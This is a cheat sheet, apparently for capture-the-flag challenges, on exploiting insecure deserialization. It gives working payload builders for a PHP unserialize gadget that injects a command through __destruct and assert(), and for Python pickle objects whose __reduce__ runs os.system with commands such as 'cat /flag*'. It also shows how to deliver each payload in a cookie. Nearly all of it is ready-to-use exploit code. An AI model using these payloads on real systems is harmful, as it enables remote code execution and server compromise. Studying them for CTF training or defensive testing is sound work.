# Deserialization

## PHP Serialized Cookie / Autoload Gadget

Use when a cookie/body is `base64(serialize($obj))` and the app calls `unserialize()` before checking the final type. Even if the function returns a default object unless `instanceof ExpectedClass`, destructors of any successfully unserialized autoloaded class still run at request shutdown.

Look for:

```php
$value = unserialize(base64_decode($_COOKIE["COOKIE_NAME"]));
return $value instanceof ExpectedClass ? $value : new ExpectedClass();

class SomeAutoloadedClass {
    function __destruct() {
        assert("safe_func('{$this->controlled}', SAFE_CONST)");
    }
}
```

Generic payload builder:

```php
<?php
final class SomeAutoloadedClass {
    public string $controlled;
    function __construct($x) { $this->controlled = $x; }
}

// Close the quoted string inside the sink, execute, then make expression valid.
$injection = "') || system('cat /flag*') || safe_func('x";
echo base64_encode(serialize(new SomeAutoloadedClass($injection))), "\n";
```

Send it as the serialized cookie:

```http
Cookie: COOKIE_NAME=BASE64_SERIALIZED_OBJECT
```

Notes:

```text
__destruct still executes even if the object is later rejected by instanceof.
PHP 7 assert("string") evaluates the string as PHP code when zend.assertions=1.
Typed public properties can still be set by serialize if the type matches.
Autoload means classes outside the main file can become gadgets.
```

## Python Pickle RCE

Use when a cookie/body/session is base64 pickle and server loads it with `pickle.loads`.

```python
import base64
import os
import pickle

class R:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(R())).decode())
```

```http
Cookie: session=BASE64_PICKLE
```

## Pickle Read Flag

```python
import base64
import os
import pickle

class R:
    def __reduce__(self):
        return (os.system, ("cat /flag*",))

print(base64.b64encode(pickle.dumps(R())).decode())
```
